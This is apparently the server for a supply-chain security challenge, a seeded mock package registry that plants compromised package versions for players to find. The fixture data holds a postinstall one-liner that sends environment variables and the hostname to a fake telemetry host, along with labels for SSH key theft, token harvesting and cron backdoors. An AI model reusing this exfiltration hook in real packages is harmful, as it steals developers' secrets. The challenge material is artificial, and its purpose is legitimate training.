/**
 * The Phantom Registry — Live Registry API
 *
 * Seeded REST service simulating a package registry.
 * Uses the same mulberry32 PRNG as the challenge module for determinism.
 */

const http = require("http");

const SEED = parseInt(process.env.SEED || "42", 10);
const PORT = parseInt(process.env.PORT || "3000", 10);

// ── mulberry32 PRNG ──────────────────────────────────────────────────

function rng(seed) {
  let s = seed | 0;
  return function () {
    s = (s + 0x6d2b79f5) | 0;
    let t = Math.imul(s ^ (s >>> 15), 1 | s);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function pick(arr, r) { return arr[Math.floor(r() * arr.length)]; }
function pickN(arr, n, r) {
  const pool = [...arr], out = [];
  for (let i = 0; i < Math.min(n, pool.length); i++) {
    const idx = Math.floor(r() * (pool.length - i));
    out.push(pool[idx]);
    pool.splice(idx, 1);
  }
  return out;
}
function randInt(min, max, r) { return min + Math.floor(r() * (max - min + 1)); }
function shuffle(arr, r) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(r() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

// ── Reuse exact same name pools and generation logic as data.ts ──────

const PACKAGE_PREFIXES = [
  "reef", "coral", "tide", "wave", "kelp", "shell", "pearl", "anchor",
  "drift", "foam", "surge", "deep", "brine", "salt", "fin", "gill",
  "scale", "hull", "mast", "keel", "stern", "bow", "plank", "rivet",
  "bolt", "chain", "rope", "net", "hook", "lure", "cast", "reel",
  "spool", "knot", "splice", "weave", "braid", "twine", "yarn", "fiber",
];
const PACKAGE_SUFFIXES = [
  "utils", "core", "lib", "io", "db", "cache", "queue", "log",
  "auth", "config", "fmt", "parse", "codec", "net", "http", "rpc",
  "cli", "test", "lint", "build", "pack", "bundle", "serve", "watch",
  "sync", "pipe", "flow", "stream", "pool", "guard", "proxy", "relay",
  "bridge", "gate", "port", "hub", "node", "link", "mesh", "grid",
];
const FIRST_NAMES = [
  "Ada", "Grace", "Alan", "Linus", "Guido", "Bjarne", "Dennis", "Ken",
  "Margaret", "Barbara", "Fran", "Hedy", "Radia", "Anita", "Katherine", "Joan",
];
const LAST_NAMES = [
  "Lovelace", "Hopper", "Turing", "Torvalds", "Rossum", "Stroustrup", "Ritchie", "Thompson",
  "Hamilton", "Liskov", "Allen", "Lamarr", "Perlman", "Borg", "Johnson", "Clarke",
];
const HANDLE_ADJECTIVES = [
  "swift", "clever", "rusty", "salty", "misty", "fuzzy", "lucky", "dusty",
  "rocky", "sandy", "stormy", "sunny", "frosty", "crispy", "curly", "dizzy",
];
const HANDLE_NOUNS = [
  "crab", "lobster", "squid", "octopus", "eel", "ray", "shark", "whale",
  "turtle", "seal", "otter", "pelican", "gull", "heron", "plover", "tern",
];
const ATTACK_VECTORS = [
  { id: "credential_phishing", label: "Credential Phishing", signals: ["LOGIN_FROM_NEW_IP", "API_TOKEN_REGENERATED", "RAPID_PUBLISH_AFTER_TOKEN_CHANGE"] },
  { id: "typosquat_takeover", label: "Typosquat + Account Takeover", signals: ["SIMILAR_PACKAGE_REGISTERED", "CONTRIBUTOR_ELEVATED", "MAINTAINER_ADDED_BY_SOCIAL_ENGINEERING"] },
  { id: "abandoned_package_takeover", label: "Abandoned Package Takeover", signals: ["OWNERSHIP_TRANSFER_REQUEST", "PACKAGE_DORMANT_THEN_ACTIVE", "BULK_VERSION_PUBLISH"] },
  { id: "build_script_injection", label: "Build Script Injection via PR", signals: ["PR_MERGED_WITH_SCRIPT_CHANGE", "POSTINSTALL_ADDED", "OBFUSCATED_SCRIPT_CONTENT"] },
];
const MALICIOUS_PAYLOADS = [
  { type: "env_exfiltration", signal: "OUTBOUND_DATA_TO_UNKNOWN_HOST" },
  { type: "ssh_key_theft", signal: "SSH_KEY_ACCESS_ATTEMPT" },
  { type: "token_harvesting", signal: "CREDENTIAL_FILE_READ" },
  { type: "backdoor_install", signal: "CRON_MODIFICATION_DETECTED" },
];

function daysAgo(d) {
  const now = new Date("2026-03-01T12:00:00Z");
  return new Date(now.getTime() - d * 86400000).toISOString();
}

// ── Generate state (identical to data.ts) ────────────────────────────

function generateState(seed) {
  const r = rng(seed);

  // Generate maintainers
  const maintainers = [];
  const usedHandles = new Set();
  for (let i = 0; i < 15; i++) {
    let handle;
    do { handle = pick(HANDLE_ADJECTIVES, r) + "-" + pick(HANDLE_NOUNS, r); } while (usedHandles.has(handle));
    usedHandles.add(handle);
    const firstName = pick(FIRST_NAMES, r), lastName = pick(LAST_NAMES, r);
    const joinDaysAgo = randInt(180, 1200, r), activeDaysAgo = randInt(0, 30, r);
    const ip1 = `${randInt(50,200,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}`;
    const ip2 = `${randInt(50,200,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}`;
    maintainers.push({
      handle, name: `${firstName} ${lastName}`,
      email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}@example.com`,
      joinedAt: daysAgo(joinDaysAgo), lastActive: daysAgo(activeDaysAgo),
      packages: [], loginIPs: [ip1, ip2], twoFactorEnabled: r() > 0.3,
    });
  }

  // Generate packages
  const packages = [];
  const usedNames = new Set();
  const prefixes = shuffle([...PACKAGE_PREFIXES], r);
  const suffixes = shuffle([...PACKAGE_SUFFIXES], r);

  for (let i = 0; i < 40; i++) {
    let name;
    do { name = prefixes[i % prefixes.length] + "-" + suffixes[i % suffixes.length]; } while (usedNames.has(name));
    usedNames.add(name);

    const maintainerIdx = i % 15;
    const secondMaintainer = (i + 3) % 15;
    const pkgMaintainers = maintainerIdx === secondMaintainer
      ? [maintainers[maintainerIdx].handle]
      : [maintainers[maintainerIdx].handle, maintainers[secondMaintainer].handle];

    for (const mh of pkgMaintainers) {
      const m = maintainers.find(m => m.handle === mh);
      if (m && !m.packages.includes(name)) m.packages.push(name);
    }

    const versionCount = randInt(3, 12, r);
    const versions = [];
    let major = 1, minor = 0, patch = 0;
    const createdDaysAgo = randInt(90, 800, r);

    for (let v = 0; v < versionCount; v++) {
      if (r() > 0.7) major++; else if (r() > 0.5) minor++; else patch++;
      const vDaysAgo = Math.max(0, createdDaysAgo - Math.floor((createdDaysAgo / versionCount) * v));
      const checksumHex = Array.from({length: 64}, () => "0123456789abcdef"[Math.floor(r() * 16)]).join("");
      versions.push({
        version: `${major}.${minor}.${patch}`,
        publishedAt: daysAgo(vDaysAgo), publishedBy: pick(pkgMaintainers, r),
        hasPostinstall: false, checksumSha256: checksumHex, size: randInt(5000, 500000, r),
      });
    }

    packages.push({
      name, description: `${pick(["High-performance","Lightweight","Production-ready","Battle-tested","Zero-dependency"], r)} ${pick(["utility","library","framework","toolkit","module"], r)} for ${pick(["data processing","stream handling","network I/O","serialization","caching","authentication","logging","configuration"], r)}`,
      currentVersion: versions[versions.length - 1].version, versions,
      maintainers: pkgMaintainers, weeklyDownloads: randInt(100, 500000, r),
      dependents: randInt(0, 2000, r), createdAt: daysAgo(createdDaysAgo),
      keywords: pickN(["async","stream","buffer","crypto","json","yaml","sql","http","tcp","udp","cache","queue"], randInt(2, 4, r), r),
    });
  }

  // Attack scenario
  const attackVector = pick(ATTACK_VECTORS, r);
  const payload = pick(MALICIOUS_PAYLOADS, r);

  let phantomHandle;
  do { phantomHandle = pick(HANDLE_ADJECTIVES, r) + "-" + pick(HANDLE_NOUNS, r); } while (usedHandles.has(phantomHandle));
  const phantomJoinedDaysAgo = randInt(45, 90, r);
  const phantomIP = `${randInt(180,220,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}.${randInt(1,254,r)}`;

  maintainers.push({
    handle: phantomHandle, name: pick(FIRST_NAMES, r) + " " + pick(LAST_NAMES, r),
    email: `${phantomHandle}@proton.me`, joinedAt: daysAgo(phantomJoinedDaysAgo),
    lastActive: daysAgo(randInt(1, 5, r)), packages: [], loginIPs: [phantomIP], twoFactorEnabled: true,
  });

  // Compromised maintainer
  const vulnerableMaintainers = maintainers.filter(m => m.packages.length >= 2 && !m.twoFactorEnabled && m.handle !== phantomHandle);
  const compromisedMaintainer = vulnerableMaintainers.length > 0
    ? pick(vulnerableMaintainers, r)
    : maintainers.find(m => m.handle !== phantomHandle && m.packages.length >= 2);

  // Target packages
  const compromisedMaintainerPkgs = packages.filter(p => p.maintainers.includes(compromisedMaintainer.handle));
  const targetPkgs = compromisedMaintainerPkgs.length >= 2
    ? pickN(compromisedMaintainerPkgs, 2, r)
    : [compromisedMaintainerPkgs[0], pick(packages.filter(p => !compromisedMaintainerPkgs.includes(p)), r)];

  const otherHighDownload = packages.filter(p => !targetPkgs.includes(p) && p.weeklyDownloads > 50000)
    .sort((a, b) => b.weeklyDownloads - a.weeklyDownloads);
  if (otherHighDownload.length > 0) targetPkgs.push(pick(otherHighDownload.slice(0, 5), r));
  else targetPkgs.push(pick(packages.filter(p => !targetPkgs.includes(p)), r));

  targetPkgs[2].maintainers.push(phantomHandle);
  maintainers.find(m => m.handle === phantomHandle).packages.push(targetPkgs[2].name);

  // Inject malicious versions
  const attackStartDaysAgo = randInt(12, 25, r);
  const compromisedPackages = [];

  for (let pi = 0; pi < targetPkgs.length; pi++) {
    const pkg = targetPkgs[pi];
    const lastVersion = pkg.versions[pkg.versions.length - 1];
    const [maj, min, pat] = lastVersion.version.split(".").map(Number);
    const maliciousVersion = `${maj}.${min}.${pat + 1}`;
    const publishDaysAgo = attackStartDaysAgo - (pi * randInt(2, 5, r));
    const maliciousChecksum = Array.from({length: 64}, () => "0123456789abcdef"[Math.floor(r() * 16)]).join("");

    const postinstallScript = `node -e "var h=require('http'),c=require('child_process');` +
      `var d={e:process.env,h:require('os').hostname()};` +
      `var r=h.request({hostname:'telemetry-cdn.${pick(["io","dev","sh"], r)}',` +
      `port:443,path:'/collect',method:'POST'},function(){});` +
      `r.write(JSON.stringify(d));r.end()"`;

    pkg.versions.push({
      version: maliciousVersion, publishedAt: daysAgo(publishDaysAgo),
      publishedBy: pi < 2 ? compromisedMaintainer.handle : phantomHandle,
      hasPostinstall: true, postinstallContent: postinstallScript,
      checksumSha256: maliciousChecksum, size: lastVersion.size + randInt(200, 800, r),
    });
    pkg.currentVersion = maliciousVersion;

    compromisedPackages.push({ name: pkg.name, compromisedVersion: maliciousVersion });
  }

  // Red herring maintainer
  const redHerringCandidates = maintainers.filter(m =>
    m.handle !== phantomHandle && m.handle !== compromisedMaintainer.handle && m.packages.length >= 2);
  const redHerringMaintainer = pick(redHerringCandidates, r);
  redHerringMaintainer.joinedAt = daysAgo(randInt(30, 60, r));
  const rhPkg = packages.find(p => p.maintainers.includes(redHerringMaintainer.handle));
  if (rhPkg) {
    const lastV = rhPkg.versions[rhPkg.versions.length - 1];
    const [rMaj, rMin, rPat] = lastV.version.split(".").map(Number);
    rhPkg.versions.push({
      version: `${rMaj}.${rMin}.${rPat + 1}`, publishedAt: daysAgo(randInt(3, 8, r)),
      publishedBy: redHerringMaintainer.handle, hasPostinstall: false,
      checksumSha256: Array.from({length: 64}, () => "0123456789abcdef"[Math.floor(r() * 16)]).join(""),
      size: lastV.size + randInt(100, 500, r),
    });
  }

  // Download stats
  const downloadStats = {};
  for (const pkg of packages) {
    const daily = [];
    const baseDaily = Math.floor(pkg.weeklyDownloads / 7);
    for (let d = 30; d >= 0; d--) {
      const noise = 1 + (r() * 0.4 - 0.2);
      let downloads = Math.floor(baseDaily * noise);
      const isCompromised = compromisedPackages.some(cp => cp.name === pkg.name);
      if (isCompromised && d < attackStartDaysAgo && d > attackStartDaysAgo - 10) {
        downloads = Math.floor(downloads * (1 + r() * 0.5));
      }
      daily.push({ date: daysAgo(d).split("T")[0], downloads });
    }
    downloadStats[pkg.name] = daily;
  }

  return { packages, maintainers, compromisedPackages, downloadStats, phantomHandle };
}

// ── Generate state at startup ────────────────────────────────────────

const state = generateState(SEED);

// ── HTTP Server ──────────────────────────────────────────────────────

function json(res, data, status = 200) {
  res.writeHead(status, { "Content-Type": "application/json" });
  res.end(JSON.stringify(data));
}

function route(method, url) {
  const [path, qs] = url.split("?");
  const params = new URLSearchParams(qs || "");
  const parts = path.split("/").filter(Boolean);
  return { method, parts, params };
}

const server = http.createServer((req, res) => {
  const { method, parts, params } = route(req.method, req.url);

  // Health check
  if (parts[0] === "health") return json(res, { status: "ok", seed: SEED });

  // GET /packages
  if (parts[0] === "packages" && !parts[1]) {
    const summary = state.packages.map(p => ({
      name: p.name, currentVersion: p.currentVersion,
      weeklyDownloads: p.weeklyDownloads, dependents: p.dependents,
      maintainers: p.maintainers, keywords: p.keywords,
    }));
    return json(res, { packages: summary });
  }

  // GET /packages/:name
  if (parts[0] === "packages" && parts[1] && !parts[2]) {
    const pkg = state.packages.find(p => p.name === parts[1]);
    if (!pkg) return json(res, { error: "Package not found" }, 404);
    return json(res, pkg);
  }

  // GET /packages/:name/versions
  if (parts[0] === "packages" && parts[2] === "versions" && !parts[3]) {
    const pkg = state.packages.find(p => p.name === parts[1]);
    if (!pkg) return json(res, { error: "Package not found" }, 404);
    return json(res, { package: pkg.name, versions: pkg.versions });
  }

  // GET /packages/:name/versions/:ver
  if (parts[0] === "packages" && parts[2] === "versions" && parts[3]) {
    const pkg = state.packages.find(p => p.name === parts[1]);
    if (!pkg) return json(res, { error: "Package not found" }, 404);
    const ver = pkg.versions.find(v => v.version === parts[3]);
    if (!ver) return json(res, { error: "Version not found" }, 404);
    return json(res, { package: pkg.name, ...ver });
  }

  // GET /maintainers
  if (parts[0] === "maintainers" && !parts[1]) {
    const summary = state.maintainers.map(m => ({
      handle: m.handle, name: m.name, joinedAt: m.joinedAt,
      packageCount: m.packages.length, twoFactorEnabled: m.twoFactorEnabled,
    }));
    return json(res, { maintainers: summary });
  }

  // GET /maintainers/:handle
  if (parts[0] === "maintainers" && parts[1]) {
    const m = state.maintainers.find(m => m.handle === parts[1]);
    if (!m) return json(res, { error: "Maintainer not found" }, 404);
    return json(res, m);
  }

  // GET /downloads/:name
  if (parts[0] === "downloads" && parts[1]) {
    const stats = state.downloadStats[parts[1]];
    if (!stats) return json(res, { error: "Package not found" }, 404);
    return json(res, { package: parts[1], daily: stats });
  }

  // GET /search?q=...
  if (parts[0] === "search") {
    const q = (params.get("q") || "").toLowerCase();
    const results = state.packages.filter(p =>
      p.name.includes(q) || p.keywords.some(k => k.includes(q)) || p.description.toLowerCase().includes(q)
    ).map(p => ({ name: p.name, description: p.description, weeklyDownloads: p.weeklyDownloads }));
    return json(res, { results });
  }

  // GET /security/flagged
  if (parts[0] === "security" && parts[1] === "flagged") {
    const flagged = state.packages
      .filter(p => p.versions.some(v => v.hasPostinstall))
      .map(p => {
        const malVer = p.versions.find(v => v.hasPostinstall);
        return {
          package: p.name, flaggedVersion: malVer.version,
          reason: "Suspicious postinstall script detected",
          severity: "critical", detectedAt: daysAgo(0),
        };
      });
    return json(res, { flagged });
  }

  // GET /metrics
  if (parts[0] === "metrics") {
    return json(res, {
      total_packages: state.packages.length,
      total_maintainers: state.maintainers.length,
      total_versions: state.packages.reduce((sum, p) => sum + p.versions.length, 0),
      packages_with_postinstall: state.packages.filter(p => p.versions.some(v => v.hasPostinstall)).length,
    });
  }

  json(res, { error: "Not found" }, 404);
});

server.listen(PORT, () => {
  console.log(`[phantom-registry-api] Listening on port ${PORT} (seed=${SEED})`);
});
